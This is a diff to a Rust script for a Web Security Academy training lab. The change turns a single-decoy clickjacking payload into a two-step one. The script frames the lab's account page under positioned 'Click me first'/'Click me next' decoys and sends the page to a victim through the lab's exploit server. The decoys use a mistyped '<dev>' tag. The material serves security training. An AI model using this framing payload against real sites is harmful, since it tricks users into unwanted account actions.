@@ -1,9 +1,9 @@
 /******************************************************************
 *
-* Lab: Basic clickjacking with CSRF token protection
+* Lab: Multistep clickjacking
 *
 * Hack Steps:
-*      1. Adjust the frame dimensions and the decoy button offset
+*      1. Adjust the frame dimensions and the decoy buttons offset
 *      2. Deliver the exploit to the victim
 *
 *******************************************************************/
@@ -19,11 +19,11 @@ use std::{
 use text_colorizer::Colorize;
 
 // Change this to your lab URL
-const LAB_URL: &str = "https://0a8f004703c24ed58785e2e200510018.web-security-academy.net";
+const LAB_URL: &str = "https://0a99004403e70ad5804e352a008b009d.web-security-academy.net";
 
 // Change this to your exploit server URL
 const EXPLOIT_SERVER_URL: &str =
-    "https://exploit-0a88007403984ed087f7e1b001a4006c.exploit-server.net";
+    "https://exploit-0aea003303a80ae5805c343a011700a9.exploit-server.net";
 
 fn main() {
     print!("❯❯ Delivering the exploit to the victim.. ");
@@ -31,8 +31,10 @@ fn main() {
 
     let frame_width = 700;
     let frame_height = 700;
-    let decoy_button_top = 500;
-    let decoy_button_left = 100;
+    let first_decoy_button_top = 500;
+    let first_decoy_button_left = 100;
+    let second_decoy_button_top = 300;
+    let second_decoy_button_left = 200;
     let payload = format!(
         r###"<head>
                 <style>
@@ -45,15 +47,22 @@ fn main() {
                         }}
                     #decoy_website {{
                         position: absolute;
-                        top: {decoy_button_top}px;
-                        left: {decoy_button_left}px;
+                        top: {first_decoy_button_top}px;
+                        left: {first_decoy_button_left}px;
+                        z-index: 1;
+                        }}
+                    #decoy_website_2 {{
+                        position: absolute;
+                        top: {second_decoy_button_top}px;
+                        left: {second_decoy_button_left}px;
                         z-index: 1;
                         }}
                 </style>
             </head>
             ...
             <body>
-                <dev id="decoy_website"> Click me </dev>
+                <dev id="decoy_website"> Click me first </dev>
+                <dev id="decoy_website_2"> Click me next </dev>
                 <iframe id="target_website" src="{LAB_URL}/my-account"></iframe>
             </body>"###
     );
